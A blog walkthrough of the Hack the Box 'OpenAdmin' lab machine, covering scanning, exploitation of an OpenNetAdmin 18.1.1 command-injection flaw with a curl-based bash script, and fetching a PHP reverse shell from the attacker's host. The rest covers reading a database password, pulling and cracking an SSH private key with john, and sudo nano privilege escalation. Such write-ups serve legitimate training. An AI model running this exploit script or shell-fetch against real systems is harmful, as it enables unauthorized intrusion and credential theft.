+++
author = "Nick"
categories = ["hack the box", "CTF", "easy", "CVE", "reverse shell", "PHP", "curl", "ssh", "john", "ssh2john", "GTFObins", "nano"]
date = 2020-05-02T14:00:00Z
description = ""
draft = false
image = "__GHOST_URL__/content/images/2020/01/infocard.png"
slug = "hack-the-box-openadmin"
summary = "Welcome back! Today we are doing the Hack the Box machine - OpenAdmin. The machine is listed as an easy Linux machine. Let's jump in!"
tags = ["hack the box", "CTF", "easy", "CVE", "reverse shell", "PHP", "curl", "ssh", "john", "ssh2john", "GTFObins", "nano"]
title = "Hack the Box - OpenAdmin"

+++


Welcome back! Today we are doing the Hack the Box machine - OpenAdmin. The machine is listed as an easy Linux machine. Let's jump in!

As always, we do our initial `nmap` scan: `nmap -sC -sV -oA initial 10.10.10.171`

We get back some basic results:
```
Nmap scan report for 10.10.10.171
Host is up (0.055s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's see what's being hosted on port 80. We  get the defaul Apache install page. A quick peek at the source doesn't show anything unusual. We start up `gobuster` to start enumerating the service.

Command:
`gobuster dir -u 10.10.10.171 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

We get back two results: `music` and `artwork`. First we'll head over to `music` and take a look. We starte numerating the page manually. Looking at the source, JS libraries and the contact form. While we are doing this we see a link to `../ona`. When we browse to it we get a `OpenNetAdmin` page.

![](/images/2020/01/image-24.png)

As the title of the box implies, we should start looking at this for vulnerabilities. First we'll `seachsploit` for any. If those results seems slim, we'll start looking around the net for further results.

Command:
`searchsploit opennetadmin`

![](/images/2020/01/image-25.png)

We know that we are running version 18.1.1, so these all fit our criteria. Let's load up `Metasploit` and see what works for us. When we search inside `Metasploit` we don't see the module listed. Hmmm, well, let's download it from [exploit DB](https://www.exploit-db.com/exploits/47691) and import it into our `Metasploit Framework'.

To do this we need to copy the exploit from `searchsploit` into our `Metasploit Framework` directory set. Metasploit keeps the modules it uses here (on Kali Linux):

`/usr/share/metasploit-framework/modules`

Inside this path you will see that it's broken down into the module types. In this case, I'm going to copy the exploit into the `/exploits/linux/http/` location.

Command:
`cp $(locate 47772.rb) /root/.msf4/modules/exploits/linux/http/opennetadmin.rb`
then
`updatedb`

You can now relaunch `Metasploit`. Once it has been launched we issue `reload_all`. This will update our modules in all paths specified. You should see the exploit count increase by one.

Now we can `use` the module.

Command:
`use exploit/linux/http/opennetadmin`

We only need to set our `lhost` and `rhost` for this module. Then we `run` it. But nothing happens. Damn it. Re-run it, still nothing. Ok, let's try the shellscript that was shown in the earlier searchsploit results. We modify the script to look as such:

```bash
#!/bin/bash

URL="http://10.10.10.171/ona/login.php"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

![](/images/2020/01/openadmin_shell_cve.gif)

Now that we have the ability to execute remote commands. Let's turn this into a shell. I tried a few things to forward a shell out but the standards didn't work. So I hosted the basic pentest monkey shell and downloaded to the target system. 

Command:
`python -m SimpleHTTPServer 80`

Then on the remote server:
`wget 10.10.14.200/sh3ll.php`

We then navigated to the `sh3ll.php` URL and obtained a reverse shell.

![](/images/2020/01/openadmin_www_shell.gif)

Now that we have a more solid shell. We can enumerate internally a bit more. We host `linpeas` on our machine and download that as well. We go through the results and see some backup files:

![](/images/2020/01/image-26.png)

We send these files back to our attacking machine. Turns out, they're nothing. We keep looking at the items that show in our output. We see the `database_settings.inc.php` file. We look inside and see a password.

![](/images/2020/01/image-27.png)

We try to use `su` to change our user. First up, `Jimmy`. It works! We try to `SSH` as Jimmy as well, that works too. Great, no need for a webshell anymore. Now we start our enumeration process as Jimmy. We see there is something running on port 52846. We can curl it and get a login form. We know from our previous enumeration that there is a site called `internal`. Inside this are some files. `main.php`, `internal.php` and `logout.php`.

We see that the `main.php` code kicks out the content of Joanna's SSH key.

```php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

So based on this we can `curl` this port and send our data. The hint is given as 'Don't forget you "ninja" password', eluding to the password we already found.

Command:
`curl -X POST -F 'username=jimmy' -F 'password=n1nj4W4rri0R!' http://127.0.0.1:52846/main.php`

We get back Joanna's SSH private key!

![](/images/2020/01/openadmin_curl_ssh.gif)

With the key we now will send it through `ssh2john` and toss the rockyou list at it.

Command:
`ssh2john before_hash > cleaned_hash`

Then we'll send this file to `john` to crack.

Command:
`john cleaned_hash --wordlist=/usr/share/wordlists/rockyou.txt`

![](/images/2020/01/image-28.png)

We get a password of `bloodninjas` back. Now let's try and log in as Joanna.

Command:
`ssh -i id_rsa joanna@10.10.10.171`

We enter the password when we are pompted and we are in!

![](/images/2020/01/image-29.png)

Now that we're in as the 'final' user. We grab our `user.txt` file and start our root based enumeration. The first thing we do is `sudo -l`.

![](/images/2020/01/image-30.png)

We see that leverage `nano` as root. Our first stop when we see this is always [GTFObins](https://gtfobins.github.io/). It seems quite a few people had issues with this. The breakdown of above is as follows:

Joanna can run `/bin/nano` as `sudo` ON the following: `/opt/priv`

![](/images/2020/01/openadmin_root_gtfo.gif" caption="Laggy root shell)

Another box down! This box was particularly unstable. Hopefully something was learned during this machine! If this walkthrough helped you, send some respect my way :) [HTB Profile](https://www.hackthebox.eu/home/users/profile/95635)



